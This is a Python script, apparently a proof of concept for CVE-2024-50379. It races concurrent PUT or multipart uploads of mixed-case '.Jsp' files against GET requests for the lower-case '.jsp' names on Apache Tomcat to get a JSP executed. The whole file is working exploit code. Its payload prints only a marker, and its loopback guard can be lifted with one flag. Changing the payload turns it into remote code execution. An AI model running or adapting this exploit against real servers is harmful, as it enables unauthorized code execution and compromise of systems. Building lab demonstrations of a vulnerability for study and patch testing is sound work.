#!/usr/bin/env python3
"""Local-only CVE-2024-50379 race demo helper.

The default mode races PUT writes to mixed-case JSP names with GET requests to
lower-case JSP names. It is intended for an isolated Tomcat lab on localhost.
"""

import argparse
import concurrent.futures
import ipaddress
import sys
import time
from urllib.parse import urljoin, urlparse

import requests


MARKER = "CVE_2024_50379_LOCAL_DEMO_MARKER"
JSP_PAYLOAD = """<%@ page contentType="text/plain; charset=UTF-8" %>
<%= "CVE_2024_50379_LOCAL_DEMO_MARKER" %>
"""


def is_loopback_url(url):
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        return False
    if host.lower() in {"localhost", "localhost.localdomain"}:
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def normalize_base_url(value):
    if not value.startswith(("http://", "https://")):
        value = "http://" + value
    return value.rstrip("/") + "/"


def put_once(session, url, timeout):
    return session.put(url, data=JSP_PAYLOAD.encode("utf-8"), timeout=timeout)


def upload_once(session, url, filename, timeout):
    files = {"file": (filename, JSP_PAYLOAD.encode("utf-8"), "application/octet-stream")}
    return session.post(url, files=files, timeout=timeout)


def get_once(session, url, timeout):
    return session.get(url, timeout=timeout)


def run_race(args):
    base_url = normalize_base_url(args.url)
    if not args.allow_non_loopback and not is_loopback_url(base_url):
        print("Refusing non-loopback target. Use only in your lab, or pass --allow-non-loopback explicitly.", file=sys.stderr)
        return 2

    session = requests.Session()
    write_urls = [urljoin(base_url, name) for name in ("aa.Jsp", "bb.Jsp")]
    read_urls = [urljoin(base_url, name) for name in ("aa.jsp", "bb.jsp")]
    if args.mode == "multipart":
        upload_url = urljoin(base_url, "upload")
        uploads_base = urljoin(base_url, "uploads/")
        read_urls = [urljoin(uploads_base, name) for name in ("aa.jsp", "bb.jsp")]

    print(f"Target: {base_url}")
    print(f"Mode: {args.mode}")
    print(f"Threads: {args.workers}, attempts: {args.attempts}")

    started = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = []
        for _ in range(args.attempts):
            if args.mode == "put":
                for write_url in write_urls:
                    futures.append(executor.submit(put_once, session, write_url, args.timeout))
            else:
                for filename in ("aa.Jsp", "bb.Jsp"):
                    futures.append(executor.submit(upload_once, session, upload_url, filename, args.timeout))
            for read_url in read_urls:
                futures.append(executor.submit(get_once, session, read_url, args.timeout))

        for future in concurrent.futures.as_completed(futures):
            try:
                response = future.result()
            except requests.RequestException as exc:
                if args.verbose:
                    print(f"request error: {exc}")
                continue

            if args.verbose:
                print(f"{response.request.method} {response.url} -> {response.status_code}")
            if MARKER in response.text:
                elapsed = time.time() - started
                print(f"SUCCESS: JSP executed at {response.url} after {elapsed:.2f}s")
                print(response.text.strip())
                return 0

    print("No JSP execution observed. Confirm vulnerable Tomcat version, Windows/case-insensitive FS, and writable default servlet/JSP handling.")
    return 1


def main():
    parser = argparse.ArgumentParser(description="Local-only CVE-2024-50379 race demo helper")
    parser.add_argument("--url", default="http://localhost:8080/tomcat-lab/", help="Base URL of the deployed lab app")
    parser.add_argument("--mode", choices=("put", "multipart"), default="put", help="Race PUT default servlet or the lab multipart upload endpoint")
    parser.add_argument("--attempts", type=int, default=500, help="Race loop count")
    parser.add_argument("--workers", type=int, default=64, help="Maximum concurrent workers")
    parser.add_argument("--timeout", type=float, default=5.0, help="HTTP request timeout in seconds")
    parser.add_argument("--allow-non-loopback", action="store_true", help="Allow targets other than localhost/127.0.0.1")
    parser.add_argument("--verbose", action="store_true", help="Print every response status")
    args = parser.parse_args()
    raise SystemExit(run_race(args))


if __name__ == "__main__":
    main()
